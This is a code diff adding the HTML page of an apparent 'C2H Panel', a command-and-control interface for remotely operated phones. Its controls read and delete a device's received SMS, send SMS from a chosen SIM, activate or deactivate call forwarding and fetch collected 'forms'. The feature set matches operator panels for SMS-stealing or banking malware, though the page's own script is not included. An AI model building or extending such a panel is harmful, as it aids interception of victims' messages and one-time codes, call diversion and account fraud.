@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Control - C2H Panel</title>
+    <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <h1>Device Control</h1>
+    </div>
+
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Control Header -->
+        <div class="control-header">
+            <h2>Device Control</h2>
+            <p id="deviceInfo">Controlling: <span id="deviceId"></span></p>
+            <div class="device-status">
+                <span class="status-dot" id="statusDot"></span>
+                <span id="statusText"></span>
+            </div>
+        </div>
+
+        <!-- Control Buttons -->
+        <div class="btn-grid">
+            <button class="btn" onclick="openFormsPage()">GET FORMS</button>
+            <button class="btn" onclick="openSendSMSModal()">SEND SMS</button>
+            <button class="btn btn-full" onclick="openCallForwardingModal()">CALL FORWARDING</button>
+        </div>
+
+        <!-- Received SMS Section -->
+        <div class="sms-section">
+            <h3>Received SMS</h3>
+            <div id="smsList" class="sms-list">
+                <!-- SMS items will be loaded here -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Send SMS Modal -->
+    <div id="sendSMSModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">Send SMS</div>
+            <div class="form-group">
+                <label>Phone Number</label>
+                <input type="tel" id="smsPhoneNumber" placeholder="+919999988888">
+            </div>
+            <div class="form-group">
+                <label>Message</label>
+                <textarea id="smsMessage" placeholder="Enter your message"></textarea>
+            </div>
+            <div class="form-group">
+                <label>SIM Slot</label>
+                <select id="smsSimSlot">
+                    <option value="0">SIM 1</option>
+                    <option value="1">SIM 2</option>
+                </select>
+            </div>
+            <div class="modal-buttons">
+                <button class="btn btn-cancel" onclick="closeModal('sendSMSModal')">Cancel</button>
+                <button class="btn btn-confirm" onclick="sendSMS()">Send SMS</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Call Forwarding Modal -->
+    <div id="callForwardingModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">Call Forwarding</div>
+            <div class="form-group">
+                <label>Forward Number</label>
+                <input type="tel" id="forwardPhoneNumber" placeholder="+919999988888">
+            </div>
+            <div class="form-group">
+                <label>SIM Slot</label>
+                <select id="forwardSimSlot">
+                    <option value="0">SIM 1</option>
+                    <option value="1">SIM 2</option>
+                </select>
+            </div>
+            <div class="modal-buttons">
+                <button class="btn btn-cancel" onclick="deactivateCallForwarding()">Deactivate</button>
+                <button class="btn btn-confirm" onclick="activateCallForwarding()">Activate</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="successModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header" id="successMessage">Command sent successfully!</div>
+            <div class="modal-buttons">
+                <button class="btn btn-confirm" onclick="closeModal('successModal')">OK</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Delete Confirmation Modal -->
+    <div id="deleteModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">Delete this item?</div>
+            <div class="modal-buttons">
+                <button class="btn btn-cancel" onclick="closeModal('deleteModal')">NO</button>
+                <button class="btn btn-confirm" onclick="confirmDeleteSMS()">YES</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/device-control.js"></script>
+</body>
+</html>
